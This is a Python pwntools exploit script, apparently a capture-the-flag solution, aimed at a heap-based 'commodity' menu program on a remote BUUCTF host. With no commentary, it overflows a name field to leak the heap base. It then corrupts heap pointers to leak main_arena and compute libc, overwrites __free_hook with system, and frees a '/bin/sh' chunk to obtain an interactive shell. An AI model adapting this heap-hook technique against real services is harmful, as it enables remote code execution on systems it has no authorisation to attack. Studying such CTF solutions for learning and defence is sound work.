from pwn import *
context.log_level = "debug"
lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")
sh = remote("node3.buuoj.cn",27027)
def add(des_size,des,name_size,name):
    sh.sendlineafter("Your choice:","1")
    sh.sendlineafter("please tell me the desrcription's size",str(name_size))
    sh.sendlineafter("please tell me the desrcript of commodity.",str(name))
    sh.sendlineafter("please tell me the commodity-name's size.",str(des_size))
    sh.sendlineafter("please tell me the commodity-name.",str(des))
def inputName(content):
    sh.sendlineafter("your name?",content)
def modifyName(content):
    sh.sendlineafter("Your choice:","6")
    sh.sendlineafter("Change your name(1~32):",content)
def free():
    sh.sendlineafter("Your choice:","4")
def edit(idx,name,des):
    sh.sendlineafter("choice:","2")
    sh.sendlineafter("index is",str(idx))
    sh.sendlineafter("name",name)
    sh.sendlineafter("desrc",des)
def empty(idx):
    sh.sendlineafter("choice:","5")
    sh.sendlineafter("just one","2")
    sh.sendlineafter("index is",str(idx))
def showall():
    sh.sendlineafter("choice:","3")
    sh.sendlineafter("all","1")
    
inputName("b" *32)
add(0x80,'\x11', 0x80,'\x12' * 0x80)

sh.sendlineafter("Your choice:","6")
sh.recvuntil("b" * 32)
heap_base = (u64(sh.recvuntil("\x2e\n",True).ljust(8,'\x00')) >> 12) << 12
log.success("heap_base: " + hex(heap_base))
sh.sendline("a" * 31)
free()
payload = 'a' * 96
payload += p64(0x600)
payload += p64(heap_base + 0x130 + 0x100 - 0x18 + 0x8 + 0x8)
payload += p64(0x800)
payload += p64(heap_base + 0x10)
add(0x80,'\x13', 0x80,payload)
add(0x80,'\x14', 0x80,'\x15' * 0x80)
add(0x80,'\x16', 0x80,'\x17' * 0x80)
modifyName('a' * 32)
empty(1)
showall()
main_arena = u64(sh.recvuntil("\x7f")[-6:].ljust(8,'\x00'))
__malloc_hook =main_arena - 88 - 0x10
libc = __malloc_hook - lib.symbols['__malloc_hook']
__free_hook = libc + lib.symbols['__free_hook']
system = libc + lib.symbols['system']
log.success("main_arena: " + hex(main_arena))
log.success("__malloc_hook: " + hex(__malloc_hook))
log.success("__free_hook: ")
payload = 'a' * 280 + p64(0x666) + p64(__free_hook) + p64(0x100) + p64(heap_base + 0x10)
edit(0,payload,'b')
edit(1,p64(system),'/bin/sh\x00')
empty(0)
sh.interactive()